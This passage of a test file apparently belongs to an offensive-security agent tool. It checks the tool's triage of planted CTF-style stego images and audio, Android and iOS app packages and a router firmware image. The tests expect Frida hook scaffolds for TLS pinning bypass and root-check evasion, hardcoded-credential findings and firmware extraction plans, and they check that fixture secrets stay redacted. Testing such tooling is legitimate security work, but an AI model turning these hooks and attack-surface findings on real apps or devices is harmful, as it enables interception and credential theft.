			[ENGAGE, workspace, stegoTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("crypto-stego");
		expect(report.commands.some((row) => row.id.startsWith("crypto-stego-"))).toBe(true);
		expect(report.commands.map((row) => row.id)).toContain("crypto-stego-media-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("crypto-stego-solver-artifact");
		expect(report.commands.map((row) => row.id)).toContain("crypto-stego-transform-claims");
		expect(report.summary.anchors).toContain("crypto/stego anchors");
		expect(report.summary.anchors).toContain("PNG/stego structure anchors");
		expect(report.summary.anchors).toContain("crypto/stego transform claim anchors");
		expect(report.nextQueue.some((command) => command.includes("crypto/stego"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("crypto-stego-media-quicklook.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("crypto-stego-transform-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("crypto-stego-solver.py"))).toBe(true);
		const mediaPath = join(report.artifactDir, "crypto-stego-media-quicklook.json");
		const transformClaimsPath = join(report.artifactDir, "crypto-stego-transform-claims.json");
		const solverPath = join(report.artifactDir, "crypto-stego-solver.py");
		expect(existsSync(mediaPath)).toBe(true);
		expect(existsSync(transformClaimsPath)).toBe(true);
		expect(existsSync(solverPath)).toBe(true);
		expect(statSync(mediaPath).mode & 0o777).toBe(0o600);
		expect(statSync(transformClaimsPath).mode & 0o777).toBe(0o600);
		expect(statSync(solverPath).mode & 0o777).toBe(0o700);
		const media = JSON.parse(readFileSync(mediaPath, "utf8")) as {
			ihdr: { width: number; height: number; colorType: number };
			idat: { count: number; bytes: number };
			chunks: Array<{ type: string; offset: number; length: number }>;
			text: Array<{ type: string; keyword: string; text: string }>;
			trailing: { offset: number; length: number; sample: string };
			embeddedArchives: Array<{ format: string; entryCount: number; entries: Array<{ name: string }> }>;
			risks: string[];
		};
		expect(JSON.stringify(media)).not.toContain(secret);
		expect(media.ihdr).toMatchObject({ width: 1, height: 1, colorType: 6 });
		expect(media.idat.count).toBe(1);
		expect(media.chunks.map((chunk) => chunk.type)).toEqual(["IHDR", "tEXt", "IDAT", "IEND"]);
		expect(media.text[0]).toMatchObject({ type: "tEXt", keyword: "Comment" });
		expect(media.text[0].text).toContain("secret=<redacted>");
		expect(media.trailing.sample).toContain("PK");
		expect(media.embeddedArchives[0]).toMatchObject({
			format: "zip",
			entryCount: 1,
			entries: [{ name: "hidden/flag.txt" }],
		});
		expect(media.risks).toEqual(
			expect.arrayContaining([
				"png-text-metadata-signal",
				"png-text-stego-signal",
				"appended-data-after-iend",
				"appended-zip-after-iend",
				"embedded-zip-archive-parsed",
			]),
		);
		const transformClaims = JSON.parse(readFileSync(transformClaimsPath, "utf8")) as {
			proofReady: boolean;
			transformProofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
		};
		expect(JSON.stringify(transformClaims)).not.toContain(secret);
		expect(transformClaims.proofReady).toBe(true);
		expect(transformClaims.transformProofReady).toBe(true);
		expect(
			transformClaims.claimLedger.some(
				(claim) => claim.claimType === "crypto-png-text-stego-signal" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			transformClaims.claimLedger.some(
				(claim) => claim.claimType === "crypto-embedded-archive-carve" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			transformClaims.composedPaths.some(
				(claim) => claim.claimType === "crypto-transform-proof-path" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			transformClaims.promotionReport.promotedClaims.some(
				(claim) => claim.claimType === "crypto-transform-proof-path",
			),
		).toBe(true);
		const solver = spawnSync("python3", [solverPath, stegoTarget], {
			encoding: "utf8",
			timeout: 15_000,
		});
		expect(solver.status, `${solver.stderr}\n${solver.stdout}`).toBe(0);
		expect(solver.stdout).not.toContain(secret);
		expect(solver.stdout).toContain('"label": "signal-string"');
		expect(solver.stdout).toContain('"label": "transform-chain"');
		expect(solver.stdout).toContain('"chain": ["base64"]');
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes WAV stego structure and LSB printable evidence", () => {
		const stegoTarget = join(workspace, "cover.wav");
		const secret = "superWavStegoSecretToken123456789";
		writeFileSync(stegoTarget, minimalWavWithLsb(secret));

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, stegoTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("crypto-stego");
		expect(report.commands.map((row) => row.id)).toContain("crypto-stego-media-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("crypto-stego-solver-artifact");
		expect(report.commands.map((row) => row.id)).toContain("crypto-stego-transform-claims");
		expect(report.summary.anchors).toContain("crypto/stego anchors");
		expect(report.summary.anchors).toContain("WAV/stego structure anchors");
		expect(report.summary.anchors).toContain("crypto/stego transform claim anchors");
		expect(report.nextQueue.some((command) => command.includes("crypto-stego-media-quicklook.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("crypto-stego-transform-claims.json"))).toBe(true);
		const mediaPath = join(report.artifactDir, "crypto-stego-media-quicklook.json");
		const transformClaimsPath = join(report.artifactDir, "crypto-stego-transform-claims.json");
		const solverPath = join(report.artifactDir, "crypto-stego-solver.py");
		expect(existsSync(mediaPath)).toBe(true);
		expect(existsSync(transformClaimsPath)).toBe(true);
		expect(existsSync(solverPath)).toBe(true);
		expect(statSync(mediaPath).mode & 0o777).toBe(0o600);
		expect(statSync(transformClaimsPath).mode & 0o777).toBe(0o600);
		expect(statSync(solverPath).mode & 0o777).toBe(0o700);
		const media = JSON.parse(readFileSync(mediaPath, "utf8")) as {
			format: string;
			fmt: { audioFormat: number; channels: number; sampleRate: number; bitsPerSample: number };
			chunks: Array<{ type: string; offset: number; length: number }>;
			metadata: Array<{ id: string; value: string }>;
			audioData: { lsb: { printableRuns: Array<{ text: string }> } };
			trailing: { offset: number; length: number; sample: string };
			embeddedArchives: Array<{ format: string; entryCount: number; entries: Array<{ name: string }> }>;
			risks: string[];
		};
		expect(JSON.stringify(media)).not.toContain(secret);
		expect(media.format).toBe("wav");
		expect(media.fmt).toMatchObject({ audioFormat: 1, channels: 1, sampleRate: 8000, bitsPerSample: 8 });
		expect(media.chunks.map((chunk) => chunk.type)).toEqual(["fmt ", "LIST", "data"]);
		expect(media.metadata[0]).toMatchObject({ id: "ICMT" });
		expect(media.metadata[0].value).toContain("secret=<redacted>");
		expect(media.audioData.lsb.printableRuns.some((row) => row.text.includes("flag{wav_lsb_demo}"))).toBe(true);
		expect(media.trailing.sample).toContain("PK");
		expect(media.embeddedArchives[0]).toMatchObject({
			format: "zip",
			entryCount: 1,
			entries: [{ name: "wav-hidden/flag.txt" }],
		});
		expect(media.risks).toEqual(
			expect.arrayContaining([
				"wav-info-metadata-signal",
				"wav-text-stego-signal",
				"wav-lsb-printable-signal",
				"appended-data-after-riff",
				"appended-zip-after-riff",
				"embedded-zip-archive-parsed",
			]),
		);
		const transformClaims = JSON.parse(readFileSync(transformClaimsPath, "utf8")) as {
			proofReady: boolean;
			transformProofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
		};
		expect(JSON.stringify(transformClaims)).not.toContain(secret);
		expect(transformClaims.proofReady).toBe(true);
		expect(transformClaims.transformProofReady).toBe(true);
		expect(
			transformClaims.claimLedger.some(
				(claim) => claim.claimType === "crypto-wav-lsb-printable-signal" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			transformClaims.claimLedger.some(
				(claim) => claim.claimType === "crypto-wav-metadata-stego-signal" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			transformClaims.composedPaths.some(
				(claim) => claim.claimType === "crypto-transform-proof-path" && claim.verdict === "promoted",
			),
		).toBe(true);
		const solver = spawnSync("python3", [solverPath, stegoTarget], {
			encoding: "utf8",
			timeout: 15_000,
		});
		expect(solver.status, `${solver.stderr}\n${solver.stdout}`).toBe(0);
		expect(solver.stdout).toContain('"label": "signal-string"');
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes APK archives and emits Frida hook scaffolds without leaking secrets", () => {
		const apkTarget = join(workspace, "app.apk");
		const secret = "superMobileSecretToken123456789";
		writeFileSync(
			apkTarget,
			minimalZip([
				{
					name: "AndroidManifest.xml",
					data: `<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.example.repi">
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.CAMERA"/>
  <application android:debuggable="true" android:usesCleartextTraffic="true" android:allowBackup="true">
    <activity android:name=".LoginActivity" android:exported="true">
      <intent-filter><action android:name="android.intent.action.VIEW"/></intent-filter>
    </activity>
    <service android:name=".SyncService" android:exported="false"/>
  </application>
</manifest>`,
				},
				{
					name: "classes.dex",
					data: minimalDex([
						"Lcom/example/AuthClient;",
						"android.permission.INTERNET",
						`https://api.example.local/v1/orders?access_token=${secret}`,
						`Authorization: Bearer ${secret}`,
						"okhttp3.CertificatePinner",
						"javax.crypto.Cipher",
						"System.loadLibrary",
						"frida xposed root",
					]),
				},
				{ name: "res/xml/network_security_config.xml", data: "<network-security-config />" },
				{ name: "lib/arm64-v8a/libnative.so", data: Buffer.from([0x7f, 0x45, 0x4c, 0x46]) },
				{ name: "META-INF/CERT.RSA", data: "certificate" },
			]),
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, apkTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("mobile");
		expect(report.commands.map((row) => row.id)).toContain("mobile-archive-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("mobile-attack-surface-claims");
		expect(report.commands.map((row) => row.id)).toContain("mobile-frida-hook-artifact");
		expect(report.summary.missingCritical).not.toContain("unzip");
		expect(report.summary.anchors).toContain("mobile package anchors");
		expect(report.summary.anchors).toContain("mobile runtime hook anchors");
		expect(report.summary.anchors).toContain("mobile DEX quicklook anchors");
		expect(report.summary.anchors).toContain("mobile manifest attack-surface anchors");
		expect(report.nextQueue.some((command) => command.includes("mobile-archive-summary.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("mobile-attack-surface-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("mobile-frida-hooks.js"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("dexQuicklook"))).toBe(true);
		const summaryPath = join(report.artifactDir, "mobile-archive-summary.json");
		const attackSurfacePath = join(report.artifactDir, "mobile-attack-surface-claims.json");
		const hookPath = join(report.artifactDir, "mobile-frida-hooks.js");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(attackSurfacePath)).toBe(true);
		expect(existsSync(hookPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(attackSurfacePath).mode & 0o777).toBe(0o600);
		expect(statSync(hookPath).mode & 0o777).toBe(0o600);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			platform: string;
			dex: Array<{ name: string }>;
			nativeLibs: Array<{ abi: string; name: string }>;
			dexQuicklook: Array<{
				validMagic: boolean;
				header: { version: string; stringIdsSize: number };
				signals: {
					classes: Array<{ text: string }>;
					endpoints: Array<{ text: string }>;
					pinning: Array<{ text: string }>;
					antiTamper: Array<{ text: string }>;
					crypto: Array<{ text: string }>;
					nativeBridge: Array<{ text: string }>;
					secrets: Array<{ text: string }>;
				};
				risks: string[];
			}>;
			manifestAnalysis: Array<{
				format: string;
				packageName: string;
				permissions: Array<{ name: string; dangerous: boolean }>;
				application: { debuggable: boolean; usesCleartextTraffic: boolean; allowBackup: boolean };
				components: Array<{
					type: string;
					name: string;
					exported: boolean | null;
					hasIntentFilter: boolean;
					risk: boolean;
				}>;
				risks: string[];
			}>;
			permissions: string[];
			certs: string[];
			risks: string[];
			signalLines: string[];
		};
		expect(JSON.stringify(summary)).not.toContain(secret);
		const attackSurface = JSON.parse(readFileSync(attackSurfacePath, "utf8")) as {
			proofReady: boolean;
			hookTargets: Array<{ id: string; platform: string; hook: string }>;
			claimLedger: Array<{ claimType: string; verdict: string; evidenceBinding: Record<string, unknown> }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(JSON.stringify(attackSurface)).not.toContain(secret);
		expect(attackSurface.proofReady).toBe(true);
		expect(attackSurface.hookTargets.map((row) => row.id)).toEqual(
			expect.arrayContaining(["android-tls-pinning-bypass", "android-root-anti-tamper", "android-native-load"]),
		);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "android-exported-component-entrypoint" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "mobile-network-endpoint" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "mobile-tls-pinning-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "mobile-runtime-pivot" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.promotionReport.promotedClaims.some((claim) => claim.claimType === "mobile-runtime-pivot"),
		).toBe(true);
		expect(summary.platform).toBe("android");
		expect(summary.dex[0].name).toBe("classes.dex");
		expect(summary.dexQuicklook[0]).toMatchObject({
			validMagic: true,
			header: { version: "035", stringIdsSize: 8 },
		});
		expect(summary.dexQuicklook[0].signals.classes.some((row) => row.text.includes("Lcom/example/AuthClient;"))).toBe(
			true,
		);
		expect(
			summary.dexQuicklook[0].signals.endpoints.some((row) => row.text.includes("access_token=<redacted>")),
		).toBe(true);
		expect(summary.dexQuicklook[0].signals.pinning.some((row) => row.text.includes("CertificatePinner"))).toBe(true);
		expect(summary.dexQuicklook[0].signals.antiTamper.some((row) => row.text.includes("frida"))).toBe(true);
		expect(summary.dexQuicklook[0].signals.crypto.some((row) => row.text.includes("javax.crypto.Cipher"))).toBe(true);
		expect(summary.dexQuicklook[0].signals.nativeBridge.some((row) => row.text.includes("System.loadLibrary"))).toBe(
			true,
		);
		expect(summary.dexQuicklook[0].signals.secrets.some((row) => row.text.includes("<redacted>"))).toBe(true);
		expect(summary.nativeLibs[0]).toMatchObject({ abi: "arm64-v8a", name: "libnative.so" });
		expect(summary.permissions).toContain("android.permission.INTERNET");
		expect(summary.permissions).toContain("android.permission.CAMERA");
		expect(summary.manifestAnalysis[0]).toMatchObject({
			format: "plain-xml",
			packageName: "com.example.repi",
			application: { debuggable: true, usesCleartextTraffic: true, allowBackup: true },
		});
		expect(summary.manifestAnalysis[0].permissions).toEqual(
			expect.arrayContaining([expect.objectContaining({ name: "android.permission.CAMERA", dangerous: true })]),
		);
		expect(summary.manifestAnalysis[0].components).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					type: "activity",
					name: ".LoginActivity",
					exported: true,
					hasIntentFilter: true,
					risk: true,
				}),
				expect.objectContaining({ type: "service", name: ".SyncService", exported: false, risk: false }),
			]),
		);
		expect(summary.certs).toContain("META-INF/CERT.RSA");
		expect(summary.risks).toEqual(
			expect.arrayContaining([
				"native-code-present",
				"network-or-pinning-signal",
				"anti-tamper-or-root-detection-signal",
				"hardcoded-secret-signal",
				"android-debuggable-enabled",
				"android-cleartext-traffic-enabled",
				"android-backup-enabled",
				"android-dangerous-permission-signal",
				"android-exported-component-signal",
				"dex-pinning-signal",
				"dex-anti-tamper-signal",
				"dex-crypto-transform-signal",
				"dex-native-bridge-signal",
				"dex-hardcoded-secret-signal",
			]),
		);
		expect(summary.signalLines.some((line) => line.includes("access_token=<redacted>"))).toBe(true);
		expect(readFileSync(hookPath, "utf8")).toContain("CertificatePinner");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(proofMatrixPath)).toBe(true);
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("mobile-attack-surface-claims.json");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes IPA Info.plist and entitlements attack surfaces", () => {
		const ipaTarget = join(workspace, "ios-app.ipa");
		writeFileSync(
			ipaTarget,
			minimalZip([
				{
					name: "Payload/Repi.app/Info.plist",
					data: `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>CFBundleIdentifier</key><string>com.example.repi</string>
  <key>CFBundleDisplayName</key><string>REPI Lab</string>
  <key>CFBundleURLTypes</key><array><dict><key>CFBundleURLSchemes</key><array><string>repi</string><string>repi-admin</string></array></dict></array>
  <key>LSApplicationQueriesSchemes</key><array><string>cydia</string><string>fb</string></array>
  <key>UIBackgroundModes</key><array><string>fetch</string></array>
  <key>NSAppTransportSecurity</key><dict>
    <key>NSAllowsArbitraryLoads</key><true/>
    <key>NSExceptionDomains</key><dict>
      <key>api.example.local</key><dict>
        <key>NSExceptionAllowsInsecureHTTPLoads</key><true/>
        <key>NSIncludesSubdomains</key><true/>
      </dict>
    </dict>
  </dict>
</dict></plist>`,
				},
				{
					name: "Payload/Repi.app/archived-expanded-entitlements.xcent",
					data: `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>application-identifier</key><string>TEAMID.com.example.repi</string>
  <key>com.apple.developer.team-identifier</key><string>TEAMID</string>
  <key>get-task-allow</key><true/>
  <key>aps-environment</key><string>development</string>
  <key>keychain-access-groups</key><array><string>TEAMID.com.example.shared</string></array>
  <key>com.apple.developer.associated-domains</key><array><string>applinks:repi.example</string></array>
  <key>com.apple.security.application-groups</key><array><string>group.com.example.repi</string></array>
</dict></plist>`,
				},
				{ name: "Payload/Repi.app/Frameworks/libHook.dylib", data: minimalMachO64() },
			]),
		);

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, ipaTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("mobile-ios");
		expect(report.commands.map((row) => row.id)).toContain("mobile-archive-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("mobile-attack-surface-claims");
		expect(report.commands.map((row) => row.id)).toContain("mobile-frida-hook-artifact");
		expect(report.summary.anchors).toContain("mobile package anchors");
		expect(report.summary.anchors).toContain("mobile iOS plist/entitlements anchors");
		expect(report.summary.anchors).toContain("mobile runtime hook anchors");
		expect(report.nextQueue.some((command) => command.includes("iosPlistAnalysis"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("mobile-attack-surface-claims.json"))).toBe(true);
		const summaryPath = join(report.artifactDir, "mobile-archive-summary.json");
		const attackSurfacePath = join(report.artifactDir, "mobile-attack-surface-claims.json");
		const hookPath = join(report.artifactDir, "mobile-frida-hooks.js");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(attackSurfacePath)).toBe(true);
		expect(existsSync(hookPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(attackSurfacePath).mode & 0o777).toBe(0o600);
		expect(statSync(hookPath).mode & 0o777).toBe(0o600);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			platform: string;
			nativeLibs: Array<{ platform: string; name: string; path: string }>;
			iosPlistAnalysis: Array<{
				bundleId: string;
				displayName: string;
				urlSchemes: string[];
				queriedSchemes: string[];
				backgroundModes: string[];
				ats: {
					allowsArbitraryLoads: boolean;
					exceptionDomains: Array<{ domain: string; allowsInsecureHttp: boolean; includesSubdomains: boolean }>;
				};
				risks: string[];
			}>;
			iosEntitlements: Array<{
				applicationIdentifier: string;
				teamIdentifier: string;
				getTaskAllow: boolean;
				keychainAccessGroups: string[];
				associatedDomains: string[];
				applicationGroups: string[];
				risks: string[];
			}>;
			risks: string[];
		};
		const attackSurface = JSON.parse(readFileSync(attackSurfacePath, "utf8")) as {
			proofReady: boolean;
			hookTargets: Array<{ id: string; platform: string }>;
			claimLedger: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
		};
		expect(attackSurface.proofReady).toBe(true);
		expect(attackSurface.hookTargets.map((row) => row.id)).toEqual(
			expect.arrayContaining(["ios-trust-eval", "ios-jailbreak-path"]),
		);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "ios-url-scheme-entrypoint" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "ios-ats-insecure-transport" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "ios-debug-entitlement" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.promotionReport.promotedClaims.some((claim) => claim.claimType === "mobile-runtime-pivot"),
		).toBe(true);
		expect(summary.platform).toBe("ios");
		expect(summary.nativeLibs[0]).toMatchObject({
			platform: "ios",
			name: "libHook.dylib",
			path: "Payload/Repi.app/Frameworks/libHook.dylib",
		});
		expect(summary.iosPlistAnalysis[0]).toMatchObject({
			bundleId: "com.example.repi",
			displayName: "REPI Lab",
			urlSchemes: ["repi", "repi-admin"],
			queriedSchemes: ["cydia", "fb"],
			backgroundModes: ["fetch"],
			ats: {
				allowsArbitraryLoads: true,
				exceptionDomains: [
					{
						domain: "api.example.local",
						allowsInsecureHttp: true,
						includesSubdomains: true,
					},
				],
			},
		});
		expect(summary.iosEntitlements[0]).toMatchObject({
			applicationIdentifier: "TEAMID.com.example.repi",
			teamIdentifier: "TEAMID",
			getTaskAllow: true,
			keychainAccessGroups: ["TEAMID.com.example.shared"],
			associatedDomains: ["applinks:repi.example"],
			applicationGroups: ["group.com.example.repi"],
		});
		expect(summary.risks).toEqual(
			expect.arrayContaining([
				"native-code-present",
				"ios-url-scheme-entrypoint",
				"ios-url-scheme-enumeration-signal",
				"ios-background-mode-signal",
				"ios-ats-arbitrary-loads",
				"ios-ats-insecure-domain-exception",
				"ios-get-task-allow-enabled",
				"ios-keychain-access-group-signal",
				"ios-associated-domain-signal",
				"ios-application-group-signal",
			]),
		);
		expect(readFileSync(hookPath, "utf8")).toContain("SecTrustEvaluate");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes firmware images and emits extraction plans without requiring binwalk", () => {
		const firmwareTarget = join(workspace, "router.bin");
		const secret = "superFirmwareSecretToken123456789";
		const firmware = Buffer.alloc(0x400);
		Buffer.from("HDR0").copy(firmware, 0);
		firmware.writeUInt32LE(0x300, 4);
		firmware.writeUInt32LE(0x11223344, 8);
		firmware.writeUInt16LE(1, 12);
		firmware.writeUInt16LE(2, 14);
		firmware.writeUInt32LE(0x40, 16);
		firmware.writeUInt32LE(0xb0, 20);
		firmware.writeUInt32LE(0x100, 24);
		Buffer.from("hsqs").copy(firmware, 0x40);
		firmware.writeUInt32LE(42, 0x44);
		firmware.writeUInt32LE(1_700_000_000, 0x48);
		firmware.writeUInt32LE(131_072, 0x4c);
		firmware.writeUInt32LE(1, 0x50);
		firmware.writeUInt16LE(4, 0x54);
		firmware.writeUInt16LE(17, 0x56);
		firmware.writeUInt16LE(0, 0x58);
		firmware.writeUInt16LE(3, 0x5a);
		firmware.writeUInt16LE(4, 0x5c);
		firmware.writeUInt16LE(0, 0x5e);
		firmware.writeBigUInt64LE(0x1234n, 0x60);
		firmware.writeBigUInt64LE(0x2222n, 0x68);
		Buffer.from("UBI#").copy(firmware, 0xb0);
		firmware[0xb4] = 1;
		firmware.writeBigUInt64BE(9n, 0xb8);
		firmware.writeUInt32BE(64, 0xc0);
		firmware.writeUInt32BE(128, 0xc4);
		firmware.writeUInt32BE(0x55667788, 0xc8);
		firmware.writeUInt32BE(0xaabbccdd, 0xec);
		Buffer.from(
			[
				"BusyBox v1.33",
				"/etc/passwd",
				"/etc/init.d/rcS",
				"/www/cgi-bin/login.cgi",
				"dropbear telnetd uhttpd",
				`password="${secret}"`,
				`http://192.168.1.1/api?access_token=${secret}`,
			].join("\0"),
		).copy(firmware, 0x100);
		writeFileSync(firmwareTarget, firmware);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, firmwareTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("firmware-iot");
		expect(report.commands.map((row) => row.id)).toContain("firmware-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("firmware-attack-surface");
		expect(report.commands.map((row) => row.id)).toContain("firmware-extract-plan-artifact");
		expect(report.summary.missingCritical).not.toContain("binwalk");
		expect(report.summary.anchors).toContain("firmware quicklook anchors");
		expect(report.summary.anchors).toContain("firmware structure anchors");
		expect(report.nextQueue.some((command) => command.includes("firmware-quicklook.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("firmware-attack-surface.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("extractionTargets"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("firmware-extract-plan.sh"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("TRX/uImage/SquashFS/UBI offsets"))).toBe(true);
		const summaryPath = join(report.artifactDir, "firmware-quicklook.json");
		const attackSurfacePath = join(report.artifactDir, "firmware-attack-surface.json");
		const planPath = join(report.artifactDir, "firmware-extract-plan.sh");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(attackSurfacePath)).toBe(true);
		expect(existsSync(planPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(attackSurfacePath).mode & 0o777).toBe(0o600);
		expect(statSync(planPath).mode & 0o777).toBe(0o700);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			signatures: Array<{ name: string; offsets: number[] }>;
			structures: {
				trx: Array<{
					length: number;
					version: number;
					partitionOffsets: number[];
					partitions: Array<{ absoluteOffset: number; size: number }>;
				}>;
				squashfs: Array<{
					endian: string;
					inodes: number;
					blockSize: number;
					compressionName: string;
					version: string;
					bytesUsed: number;
				}>;
				ubi: Array<{
					version: number;
					eraseCount: number;
					vidHeaderOffset: number;
					dataOffset: number;
					imageSequence: number;
				}>;
			};
			stringScan: {
				signals: {
					credentials: Array<{ text: string }>;
					urls: Array<{ text: string }>;
					services: Array<{ text: string }>;
					paths: Array<{ text: string }>;
				};
			};
			risks: string[];
		};
		expect(JSON.stringify(summary)).not.toContain(secret);
		const attackSurface = JSON.parse(readFileSync(attackSurfacePath, "utf8")) as {
			proofReady: boolean;
			extractionTargets: Array<{ type: string; offset: number; size?: number; command: string }>;
			claimLedger: Array<{ claimType: string; verdict: string; sourceBinding: Record<string, unknown> }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(JSON.stringify(attackSurface)).not.toContain(secret);
		expect(attackSurface.proofReady).toBe(true);
		expect(attackSurface.extractionTargets.some((row) => row.type === "squashfs-rootfs" && row.offset === 0x40)).toBe(
			true,
		);
		expect(attackSurface.extractionTargets.some((row) => row.type === "ubi-volume" && row.offset === 0xb0)).toBe(
			true,
		);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "firmware-rootfs-extraction-target" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			attackSurface.claimLedger.some(
				(claim) => claim.claimType === "firmware-hardcoded-credential" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
